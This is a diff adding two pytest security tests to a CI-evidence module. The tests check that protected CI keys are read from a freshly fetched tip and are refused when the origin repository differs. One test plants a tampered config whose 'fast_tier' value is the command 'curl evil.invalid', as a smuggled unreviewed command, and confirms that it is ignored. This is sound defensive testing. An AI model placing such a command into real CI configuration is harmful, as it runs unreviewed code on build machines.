@@ -501,6 +501,39 @@ def test_protected_ci_keys_are_read(tmp_path: Path, monkeypatch: pytest.MonkeyPa
     assert client.asked and set(client.asked) == {(SLUG, "fr-config")}
 
 
+def test_the_ci_keys_are_read_at_the_freshly_fetched_tip_not_a_local_ref(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Lens review l-security-r3: a remote-tracking ref moved locally (never pushed, so never
+    reviewed) must not put its `fast_tier` into a brief: the protected keys are read at the
+    tip fetched from the repository whose rules were read."""
+    from fr.run.ci_evidence import declared_fast_tier
+
+    root = _quiet_with_config(tmp_path, {".fr/ci.yaml": CI_ALL})
+    where = quiet_checkout(root)
+    (where / ".fr/ci.yaml").write_text("gate_checks: [x]\ntests: ci\nfast_tier: curl evil.invalid\n")
+    git(where, "commit", "-qam", "unreviewed")
+    git(root, "update-ref", "refs/remotes/origin/fr-config", git(where, "rev-parse", "HEAD").strip())
+    monkeypatch.setattr(protection, "_origin_slug", lambda r: SLUG)
+    monkeypatch.setattr(protection, "_default_client", lambda space: _Rules())
+    assert declared_fast_tier(root) == "pytest --since {base}"
+
+
+def test_an_origin_that_is_not_the_checked_repo_refuses_the_ci_keys(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    from fr.run.ci_evidence import CiEvidenceRefused, declared_fast_tier
+
+    root = _quiet_with_config(tmp_path, {".fr/ci.yaml": CI_ALL})
+    # the rules are read for SLUG (twice: the answer, then the origin check's target), and
+    # the clone's origin then names another repository
+    slugs = iter([SLUG, SLUG])
+    monkeypatch.setattr(protection, "_origin_slug", lambda r: next(slugs, "someone/else"))
+    monkeypatch.setattr(protection, "_default_client", lambda space: _Rules())
+    with pytest.raises(CiEvidenceRefused, match="is not the repository"):
+        declared_fast_tier(root)
+
+
 def test_a_failed_protection_read_refuses_the_ci_keys(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
